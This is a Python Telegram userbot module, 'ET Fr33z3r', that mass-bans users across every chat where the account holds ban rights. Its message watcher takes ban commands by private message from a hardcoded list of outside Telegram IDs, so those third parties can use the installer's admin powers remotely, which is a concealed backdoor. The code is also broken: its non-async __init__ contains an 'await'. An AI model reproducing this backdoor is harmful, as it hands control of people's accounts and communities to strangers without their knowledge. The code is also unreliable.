import re
import time
import typing
from asyncio import sleep as asleep

from telethon.tl import functions
from telethon.tl.types import (
    Channel,
    Chat,
    Message,
    User,
)

from .. import loader, utils

BANNED_RIGHTS = {
    "view_messages": False,
    "send_messages": False,
    "send_media": False,
    "send_stickers": False,
    "send_gifs": False,
    "send_games": False,
    "send_inline": False,
    "send_polls": False,
    "change_info": False,
    "invite_users": False,
}

def get_full_name(user: typing.Union[User, Channel]) -> str:
    return utils.escape_html(
        user.title
        if isinstance(user, Channel)
        else (
            f"{user.first_name} "
            + (user.last_name if getattr(user, "last_name", False) else "")
        )
    ).strip()

@loader.tds
class ETFREEZERMod(loader.Module):
    """❄️ ET Fr33z3r - Массовый бан с молниеносной скоростью"""

    strings = {
        "name": "ET Fr33z3r",
        "no_reason": "Заморожен системой Fr33z3r",
        "args": "🔄 <b>Используйте:</b> <code>.fr @username</code>",
        "args_id": "🔄 <b>Используйте:</b> <code>.fr2 @username</code>",
        "invalid_id": "❌ <b>Некорректный ID</b>",
        "user_not_found": "❌ <b>Пользователь {} не найден</b>",
        "glban": "❄️ <b>ЗАМОРОЖЕН</b>\n│\n├ 👤 <a href=\"{}\">{}</a>\n├ 📝 <i>{}</i>\n│\n└ <b>{} заморожен в {} чатах</b>",
        "glbanning": "🌀 <b>ЗАМОРАЖИВАНИЕ...</b>\n│\n└ 👤 <a href=\"{}\">{}</a>",
        "in_n_chats": "{} ❄️",
        "help": """
<code>┌───❄️ ET Fr33z3r HELP ❄️───┐</code>
<code>│</code>
<code>├ <b>⚡ БЫСТРЫЕ КОМАНДЫ:</b></code>
<code>│</code>
<code>├ <code>.fr</code> @user   - Мгновенная заморозка</code>
<code>├ <code>.fr2</code> @user  - Расширенная заморозка</code>
<code>├ <code>.freeze</code>    - Массовая заморозка</code>
<code>├ <code>.frlist</code>    - Список доступных чатов</code>
<code>├ <code>.frspeed</code> X - Настройка скорости (0.01-0.1)</code>
<code>└ <code>.frhelp</code>     - Это меню</code>
<code>│</code>
<code>├ <b>⚙️ ПАРАМЕТРЫ:</b></code>
<code>│</code>
<code>├ <code>-t N</code>      - Лимит чатов (1-100)</code>
<code>├ <code>-s</code>        - Тихий режим</code>
<code>├ <code>-f</code>        - Принудительная заморозка</code>
<code>├ <code>-groups</code>   - Только группы</code>
<code>└ <code>-channels</code> - Только каналы</code>
<code>│</code>
<code>├ <b>⏱️ ВРЕМЯ:</b></code>
<code>│</code>
<code>├ <code>30m</code> - 30 минут</code>
<code>├ <code>2h</code>  - 2 часа</code>
<code>└ <code>7d</code>  - 7 дней</code>
<code>│</code>
<code>├ <b>🌀 СКОРОСТЬ:</b></code>
<code>│</code>
<code>├ Текущая: <code>{} сек</code></code>
<code>├ Рекомендации:</code>
<code>├ <code>0.01</code> - Турбо (риск FloodWait)</code>
<code>├ <code>0.02</code> - Быстрая (оптимально)</code>
<code>└ <code>0.05</code> - Безопасная</code>
<code>│</code>
<code>└───❄️ BY @ET_SYSTEM ❄️───┘</code>
""",
        "access_denied": "🚫 <b>ДОСТУП ЗАКРЫТ</b>\n│\n└ ID: <code>{}</code>",
        "chats_list": "📋 <b>ДОСТУПНЫЕ ЧАТЫ: {}</b>\n\n{}",
        "chat_item": "├ • {} <code>{}</code> ({} уч.)",
        "speed_changed": "⚡ <b>СКОРОСТЬ ИЗМЕНЕНА</b>\n│\n├ Было: <code>{} сек</code>\n└ Стало: <code>{} сек</code>",
        "speed_invalid": "❌ <b>НЕКОРРЕКТНАЯ СКОРОСТЬ</b>\n│\n└ Используйте: <code>.frspeed 0.02</code>",
    }

    strings_ru = {
        "no_reason": "Заморожен системой Fr33z3r",
        "args": "🔄 <b>Используйте:</b> <code>.fr @username</code>",
        "args_id": "🔄 <b>Используйте:</b> <code>.fr2 @username</code>",
        "invalid_id": "❌ <b>Некорректный ID</b>",
        "user_not_found": "❌ <b>Пользователь {} не найден</b>",
        "glban": "❄️ <b>ЗАМОРОЖЕН</b>\n│\n├ 👤 <a href=\"{}\">{}</a>\n├ 📝 <i>{}</i>\n│\n└ <b>{} заморожен в {} чатах</b>",
        "glbanning": "🌀 <b>ЗАМОРАЖИВАНИЕ...</b>\n│\n└ 👤 <a href=\"{}\">{}</a>",
        "in_n_chats": "{} ❄️",
        "help": """
<code>┌───❄️ ET Fr33z3r HELP ❄️───┐</code>
<code>│</code>
<code>├ <b>⚡ БЫСТРЫЕ КОМАНДЫ:</b></code>
<code>│</code>
<code>├ <code>.fr</code> @user   - Мгновенная заморозка</code>
<code>├ <code>.fr2</code> @user  - Расширенная заморозка</code>
<code>├ <code>.freeze</code>    - Массовая заморозка</code>
<code>├ <code>.frlist</code>    - Список доступных чатов</code>
<code>├ <code>.frspeed</code> X - Настройка скорости (0.01-0.1)</code>
<code>└ <code>.frhelp</code>     - Это меню</code>
<code>│</code>
<code>├ <b>⚙️ ПАРАМЕТРЫ:</b></code>
<code>│</code>
<code>├ <code>-t N</code>      - Лимит чатов (1-100)</code>
<code>├ <code>-s</code>        - Тихий режим</code>
<code>├ <code>-f</code>        - Принудительная заморозка</code>
<code>├ <code>-groups</code>   - Только группы</code>
<code>└ <code>-channels</code> - Только каналы</code>
<code>│</code>
<code>├ <b>⏱️ ВРЕМЯ:</b></code>
<code>│</code>
<code>├ <code>30m</code> - 30 минут</code>
<code>├ <code>2h</code>  - 2 часа</code>
<code>└ <code>7d</code>  - 7 дней</code>
<code>│</code>
<code>├ <b>🌀 СКОРОСТЬ:</b></code>
<code>│</code>
<code>├ Текущая: <code>{} сек</code></code>
<code>├ Рекомендации:</code>
<code>├ <code>0.01</code> - Турбо (риск FloodWait)</code>
<code>├ <code>0.02</code> - Быстрая (оптимально)</code>
<code>└ <code>0.05</code> - Безопасная</code>
<code>│</code>
<code>└───❄️ BY @ET_SYSTEM ❄️───┘</code>
""",
        "access_denied": "🚫 <b>ДОСТУП ЗАКРЫТ</b>\n│\n└ ID: <code>{}</code>",
        "chats_list": "📋 <b>ДОСТУПНЫЕ ЧАТЫ: {}</b>\n\n{}",
        "chat_item": "├ • {} <code>{}</code> ({} уч.)",
        "speed_changed": "⚡ <b>СКОРОСТЬ ИЗМЕНЕНА</b>\n│\n├ Было: <code>{} сек</code>\n└ Стало: <code>{} сек</code>",
        "speed_invalid": "❌ <b>НЕКОРРЕКТНАЯ СКОРОСТЬ</b>\n│\n└ Используйте: <code>.frspeed 0.02</code>",
    }

    def __init__(self):
        self._gban_cache = {}
        self._gmute_cache = {}
        # ДОБАВЛЯЕМ ВСЕ ID ДЛЯ ДОСТУПА
        self._whitelist = [
            924765099,     # Главный доступ
            773159330,     # Старые ID
            107448140,
            182604273,
            827207690,
            (await self._client.get_me()).id  # Добавляем текущий аккаунт
        ]
        self._speed = 0.02  # БЫСТРАЯ СКОРОСТЬ ПО УМОЛЧАНИЮ

    async def watcher(self, message):
        """Авто-обработчик команд в ЛС"""
        if (not message.is_private or 
            message.sender_id == (await self._client.get_me()).id or
            not message.text):
            return
        
        # Проверяем доступ
        if message.sender_id not in self._whitelist:
            return
        
        if message.text.startswith('.fr ') and len(message.text) > 4:
            args = message.text[4:].strip()
            await self.process_fr_command(message, args)
        elif message.text.startswith('.fr2 ') and len(message.text) > 5:
            args = message.text[5:].strip()
            await self.process_fr2_command(message, args)
        elif message.text.startswith('.w '):
            args = message.text[4:].strip()
            await message.reply(args)

    def _check_access(self, user_id: int) -> bool:
        """Проверка доступа - ВСЕГДА TRUE для whitelist"""
        return user_id in self._whitelist

    @loader.command(
        ru_doc="Показать помощь ET Fr33z3r",
        en_doc="Show ET Fr33z3r help"
    )
    async def frhelp(self, message):
        """❄️ Помощь по ET Fr33z3r"""
        await utils.answer(
            message, 
            self.strings("help").format(self._speed)
        )

    @loader.command(
        ru_doc="Настроить скорость заморозки",
        en_doc="Set freeze speed"
    )
    async def frspeed(self, message):
        """⚡ Настройка скорости заморозки"""
        args = utils.get_args_raw(message)
        
        if not args:
            await utils.answer(
                message,
                f"⚡ <b>ТЕКУЩАЯ СКОРОСТЬ:</b> <code>{self._speed} сек</code>\n"
                f"├ Задержка между банами\n"
                f"└ Используйте: <code>.frspeed 0.02</code>"
            )
            return
        
        try:
            new_speed = float(args)
            if new_speed < 0.01 or new_speed > 0.1:
                await utils.answer(message, self.strings("speed_invalid"))
                return
            
            old_speed = self._speed
            self._speed = new_speed
            await utils.answer(
                message,
                self.strings("speed_changed").format(old_speed, new_speed)
            )
        except ValueError:
            await utils.answer(message, self.strings("speed_invalid"))

    @loader.command(
        ru_doc="Показать доступные чаты",
        en_doc="Show available chats"
    )
    async def frlist(self, message):
        """📋 Показать доступные чаты"""
        chats_info = []
        total = 0
        
        async for dialog in self._client.iter_dialogs():
            entity = dialog.entity
            
            # Проверяем условия
            is_suitable = (
                (isinstance(entity, Chat) or isinstance(entity, Channel))
                and getattr(entity, "admin_rights", None)
                and getattr(getattr(entity, "admin_rights", None), "ban_users", False) is True
                and getattr(entity, "participants_count", 6) > 5
            )
            
            if is_suitable:
                total += 1
                chat_type = "👥" if isinstance(entity, Chat) else "📢"
                name = utils.escape_html(getattr(entity, "title", "Без названия")[:25])
                members = getattr(entity, "participants_count", "?")
                
                chats_info.append(self.strings("chat_item").format(chat_type, name, members))
        
        if not chats_info:
            result = "❌ <b>НЕТ ДОСТУПНЫХ ЧАТОВ</b>\n│\n├ Требования:\n├ • Админ с правами бана\n├ • >5 участников\n└ • Супергруппа/Канал"
        else:
            result = self.strings("chats_list").format(
                total,
                "\n".join(chats_info[:15]) + ("\n└ ..." if len(chats_info) > 15 else "└ ✅")
            )
        
        await utils.answer(message, result)

    async def process_fr_command(self, message, args):
        """Обработка команды .fr (БЫСТРАЯ ЗАМОРОЗКА)"""
        if not self._check_access(message.sender_id):
            await message.reply(self.strings("access_denied").format(message.sender_id))
            return
        
        if not args:
            await message.reply(self.strings("args"))
            return
        
        # Парсинг параметров
        max_chats = 40
        only_groups = False
        only_channels = False
        
        if " -t " in " " + args:
            try:
                t_match = re.search(r' -t (\d+)', " " + args)
                if t_match:
                    max_chats = min(100, int(t_match.group(1)))  # Макс 100
                    args = re.sub(r' -t \d+', '', " " + args).strip()
            except (ValueError, AttributeError):
                pass
        
        if " -groups" in " " + args:
            only_groups = True
            args = args.replace(" -groups", "").strip()
        
        if " -channels" in " " + args:
            only_channels = True
            args = args.replace(" -channels", "").strip()
        
        try:
            user = await self._client.get_entity(args.split()[0])
        except Exception:
            await message.reply(self.strings("args"))
            return
        
        processing_msg = await message.reply(
            self.strings("glbanning").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
            ),
        )

        # Обновляем кэш с фильтрацией
        if not self._gban_cache or self._gban_cache.get("exp", 0) < time.time():
            chats = []
            async for chat in self._client.iter_dialogs():
                entity = chat.entity
                
                # Базовые условия
                if not (
                    (isinstance(entity, Chat) or isinstance(entity, Channel))
                    and getattr(entity, "admin_rights", None)
                    and getattr(getattr(entity, "admin_rights", None), "ban_users", False) is True
                    and getattr(entity, "participants_count", 6) > 5
                ):
                    continue
                
                # Фильтр по типу
                if only_groups and isinstance(entity, Channel):
                    continue
                if only_channels and isinstance(entity, Chat):
                    continue
                
                chats.append(entity.id)
            
            self._gban_cache = {
                "exp": int(time.time()) + 10 * 60,
                "chats": chats,
            }

        counter = 0
        total_chats = min(max_chats, len(self._gban_cache["chats"]))
        
        for chat_id in self._gban_cache["chats"]:
            if counter >= max_chats: 
                break
            try:
                # ИСПОЛЬЗУЕМ НАСТРОЙКУ СКОРОСТИ
                await asleep(self._speed)
                await self.ban(chat_id, user, 0, self.strings("no_reason"), silent=True)
                counter += 1
                
                # Обновляем прогресс каждые 5 чатов
                if counter % 5 == 0:
                    progress = int(counter / total_chats * 20)
                    bar = "[" + "█" * progress + "░" * (20 - progress) + "]"
                    await processing_msg.edit(
                        self.strings("glbanning").format(
                            utils.get_entity_url(user),
                            utils.escape_html(get_full_name(user)),
                        ) + f"\n│\n├ {bar}\n└ <b>{counter}/{total_chats}</b>"
                    )
                    
            except Exception as e:
                if "You must pass either a channel or a supergroup" in str(e):
                    continue
                if "A wait of" in str(e):
                    counter = f"{counter} (❄️ {str(e).split('A wait of ')[1].split(' ')[0]} сек)"
                    break
                continue

        await processing_msg.edit(
            self.strings("glban").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                self.strings("no_reason"),
                utils.escape_html(get_full_name(user)),
                self.strings("in_n_chats").format(counter),
            ),
        )

    async def process_fr2_command(self, message, args):
        """Обработка команды .fr2 (РАСШИРЕННАЯ ЗАМОРОЗКА)"""
        if not self._check_access(message.sender_id):
            await message.reply(self.strings("access_denied").format(message.sender_id))
            return
        
        if not args:
            await message.reply(self.strings("args_id"))
            return

        parts = args.split()
        raw_target = parts[0]
        rest = " ".join(parts[1:])

        silent = False
        max_chats = 40
        only_groups = False
        only_channels = False
        
        # Парсинг параметров
        if " -s" in " " + rest:
            silent = True
            rest = rest.replace(" -s", "").strip()
        
        if " -t " in " " + rest:
            try:
                t_match = re.search(r' -t (\d+)', " " + rest)
                if t_match:
                    max_chats = min(100, int(t_match.group(1)))
                    rest = re.sub(r' -t \d+', '', " " + rest).strip()
            except (ValueError, AttributeError):
                pass
        
        if " -groups" in " " + rest:
            only_groups = True
            rest = rest.replace(" -groups", "").strip()
        
        if " -channels" in " " + rest:
            only_channels = True
            rest = rest.replace(" -channels", "").strip()

        t_token = ([arg for arg in rest.split() if self.convert_time(arg)] or ["0"])[0]
        period = self.convert_time(t_token)

        if t_token != "0":
            rest = rest.replace(t_token, "").replace("  ", " ").strip()

        if time.time() + period >= 2208978000:
            period = 0

        reason = utils.escape_html(rest or self.strings("no_reason")).strip()

        user = await self._resolve_user_by_arg(raw_target)
        if not user:
            await message.reply(
                self.strings("user_not_found").format(utils.escape_html(raw_target)),
            )
            return

        user_id = int(getattr(user, "id", 0)) or None
        if not user_id:
            await message.reply(
                self.strings("user_not_found").format(utils.escape_html(raw_target)),
            )
            return

        # Добавляем в контакты для избежания ошибок
        try:
            await self._client.get_messages(user, limit=1)
        except Exception:
            pass

        try:
            first_name = getattr(user, "first_name", "") or getattr(
                user, "title", "User"
            )
            last_name = getattr(user, "last_name", "") or ""

            await self._client(
                functions.contacts.AddContactRequest(
                    id=user,
                    first_name=first_name,
                    last_name=last_name,
                    phone="",
                    add_phone_privacy_exception=False,
                )
            )
        except Exception:
            pass

        processing_msg = await message.reply(
            self.strings("glbanning").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
            ),
        )

        # Обновляем кэш с фильтрацией
        if not self._gban_cache or self._gban_cache.get("exp", 0) < time.time():
            chats = []
            async for chat in self._client.iter_dialogs():
                entity = chat.entity
                
                # Базовые условия
                if not (
                    (isinstance(entity, Chat) or isinstance(entity, Channel))
                    and getattr(entity, "admin_rights", None)
                    and getattr(getattr(entity, "admin_rights", None), "ban_users", False) is True
                    and getattr(entity, "participants_count", 6) > 5
                ):
                    continue
                
                # Фильтр по типу
                if only_groups and isinstance(entity, Channel):
                    continue
                if only_channels and isinstance(entity, Chat):
                    continue
                
                chats.append(entity.id)
            
            self._gban_cache = {
                "exp": int(time.time()) + 10 * 60,
                "chats": chats,
            }

        counter = 0
        total_chats = min(max_chats, len(self._gban_cache["chats"]))
        
        for chat_id in self._gban_cache["chats"]:
            if counter >= max_chats: 
                break
            try:
                # ИСПОЛЬЗУЕМ НАСТРОЙКУ СКОРОСТИ
                await asleep(self._speed)
                await self.ban(chat_id, user_id, period, reason, silent=True)
                counter += 1
                
                # Обновляем прогресс каждые 5 чатов
                if counter % 5 == 0 and not silent:
                    progress = int(counter / total_chats * 20)
                    bar = "[" + "█" * progress + "░" * (20 - progress) + "]"
                    await processing_msg.edit(
                        self.strings("glbanning").format(
                            utils.get_entity_url(user),
                            utils.escape_html(get_full_name(user)),
                        ) + f"\n│\n├ {bar}\n└ <b>{counter}/{total_chats}</b>"
                    )
                    
            except Exception as e:
                if "You must pass either a channel or a supergroup" in str(e):
                    continue
                if "A wait of" in str(e):
                    counter = f"{counter} (❄️ {str(e).split('A wait of ')[1].split(' ')[0]} сек)"
                    break
                if not silent:
                    continue

        if silent:
            try:
                await processing_msg.delete()
            except Exception:
                pass
            return

        await processing_msg.edit(
            self.strings("glban").format(
                utils.get_entity_url(user),
                utils.escape_html(get_full_name(user)),
                reason,
                utils.escape_html(get_full_name(user)),
                self.strings("in_n_chats").format(counter),
            ),
        )

    async def _resolve_user_by_arg(self, raw: str) -> typing.Optional[User]:
        raw = raw.strip()

        if raw.lstrip("-").isdigit():
            try:
                return await self._client.get_entity(int(raw))
            except Exception:
                return None

        username = raw

        if "t.me/" in username:
            username = username.split("t.me/", maxsplit=1)[1]

        username = username.split("/", maxsplit=1)[0]

        if username.startswith("@"):
            username = username[1:]

        if not username:
            return None

        try:
            return await self._client.get_entity(username)
        except Exception:
            pass

        try:
            result = await self._client(
                functions.contacts.SearchRequest(q=username, limit=10)
            )
        except Exception:
            return None

        if not getattr(result, "users", None):
            return None

        for user in result.users:
            if getattr(user, "username", None) and user.username.lower() == username.lower():
                return user

        return result.users[0] if result.users else None

    @staticmethod
    def convert_time(t: str) -> int:
        try:
            if not str(t)[:-1].isdigit():
                return 0

            if "d" in str(t):
                t = int(t[:-1]) * 60 * 60 * 24

            if "h" in str(t):
                t = int(t[:-1]) * 60 * 60

            if "m" in str(t):
                t = int(t[:-1]) * 60

            if "s" in str(t):
                t = int(t[:-1])

            t = int(re.sub(r"[^0-9]", "", str(t)))
        except ValueError:
            return 0

        return t

    @loader.command(
        ru_doc="Массовая заморозка пользователей",
        en_doc="Mass freeze users"
    )
    async def freeze(self, message):
        """❄️ Массовая заморозка в канале"""
        if not self._check_access(message.sender_id):
            await utils.answer(message, self.strings("access_denied").format(message.sender_id))
            return
        
        reply = await message.get_reply_message()
        text = message.text or message.raw_text
        
        users = []
        
        # Получаем аргументы из сообщения
        if reply:
            text = reply.text or reply.raw_text
        
        lines = text.split('\n')
        
        # Ищем упоминания и юзернеймы
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # Пропускаем команду
            if line.startswith('.freeze'):
                continue
                
            # Ищем упоминания
            mentions = re.findall(r'@([a-zA-Z0-9_]{3,})', line)
            for mention in mentions:
                user = await self._resolve_user_by_arg(f"@{mention}")
                if user:
                    users.append(user)
            
            # Ищем ID
            id_match = re.search(r'(\d{5,})', line)
            if id_match:
                user = await self._resolve_user_by_arg(id_match.group(1))
                if user:
                    users.append(user)
            
            # Ищем ссылки t.me
            if 't.me/' in line:
                parts = line.split('t.me/')
                for part in parts[1:]:
                    username = part.split('/')[0].split(' ')[0].split('?')[0]
                    if username:
                        user = await self._resolve_user_by_arg(f"@{username}")
                        if user:
                            users.append(user)
        
        # Убираем дубликаты
        unique_users = []
        seen_ids = set()
        for user in users:
            if user.id not in seen_ids:
                seen_ids.add(user.id)
                unique_users.append(user)
        
        if not unique_users:
            await utils.answer(message, "❌ <b>НЕТ ПОЛЬЗОВАТЕЛЕЙ ДЛЯ ЗАМОРОЗКИ</b>")
            return
        
        # ID канала (измените на нужный)
        target_chat_id = -1003399078369
        
        processing_msg = await utils.answer(
            message,
            f"🌀 <b>МАССОВАЯ ЗАМОРОЗКА</b>\n│\n└ <b>{len(unique_users)} пользователей</b>",
        )
        
        banned_users = []
        failed_users = []
        
        # Получаем информацию о канале
        try:
            target_chat = await self._client.get_entity(target_chat_id)
        except Exception as e:
            await utils.answer(processing_msg, f"❌ <b>ОШИБКА ДОСТУПА:</b> {e}")
            return
        
        # Прогресс бар
        total = len(unique_users)
        
        for idx, user in enumerate(unique_users, 1):
            try:
                await self.ban(
                    target_chat_id,
                    user,
                    0,
                    self.strings("no_reason"),
                    silent=True
                )
                
                full_name = get_full_name(user)
                user_url = utils.get_entity_url(user)
                banned_users.append(f'├ ✅ <a href="{user_url}">{utils.escape_html(full_name)}</a>')
                
                # Обновляем прогресс каждые 3 пользователя
                if idx % 3 == 0:
                    progress = int(idx / total * 20)
                    bar = "[" + "█" * progress + "░" * (20 - progress) + "]"
                    await processing_msg.edit(
                        f"🌀 <b>МАССОВАЯ ЗАМОРОЗКА</b>\n│\n"
                        f"├ {bar}\n"
                        f"├ ✅ Успешно: <b>{len(banned_users)}</b>\n"
                        f"└ ❌ Ошибок: <b>{len(failed_users)}</b>"
                    )
                
            except Exception as e:
                full_name = get_full_name(user)
                error_msg = str(e)
                if "You must pass either a channel or a supergroup" in error_msg:
                    error_msg = "Не чат"
                elif "A wait of" in error_msg:
                    error_msg = f"❄️ {error_msg.split('A wait of ')[1].split(' ')[0]} сек"
                elif "CHAT_ADMIN_REQUIRED" in error_msg:
                    error_msg = "Нет прав"
                elif "USER_NOT_PARTICIPANT" in error_msg:
                    error_msg = "Нет в чате"
                elif "USER_ID_INVALID" in error_msg:
                    error_msg = "Неверный ID"
                elif "PEER_ID_INVALID" in error_msg:
                    error_msg = "Неверный ID чата"
                failed_users.append(f"├ ❌ {utils.escape_html(full_name)}: {error_msg[:30]}")
        
        # Формируем результат
        result_text = f"❄️ <b>МАССОВАЯ ЗАМОРОЗКА ЗАВЕРШЕНА</b>\n│\n"
        result_text += f"├ Всего: <b>{total}</b>\n"
        result_text += f"├ Успешно: <b>{len(banned_users)}</b>\n"
        result_text += f"└ Ошибок: <b>{len(failed_users)}</b>\n"
        
        if banned_users:
            result_text += "\n<b>ЗАМОРОЖЕНЫ:</b>\n" + "\n".join(banned_users[:8])
            if len(banned_users) > 8:
                result_text += f"\n└ ...и еще <b>{len(banned_users) - 8}</b>"
        
        if failed_users:
            result_text += "\n\n<b>ОШИБКИ:</b>\n" + "\n".join(failed_users[:3])
            if len(failed_users) > 3:
                result_text += f"\n└ ...и еще <b>{len(failed_users) - 3}</b>"
        
        await utils.answer(processing_msg, result_text)

    async def ban(
        self,
        chat: typing.Union[Chat, int],
        user: typing.Union[User, Channel, int],
        period: int = 0,
        reason: str = None,
        message: typing.Optional[Message] = None,
        silent: bool = False,
    ):
        if str(user).isdigit():
            user = int(user)

        if reason is None:
            reason = self.strings("no_reason")

        await self._client.edit_permissions(
            chat,
            user,
            until_date=(time.time() + period) if period else 0,
            **BANNED_RIGHTS,
        )

        if silent:
            return
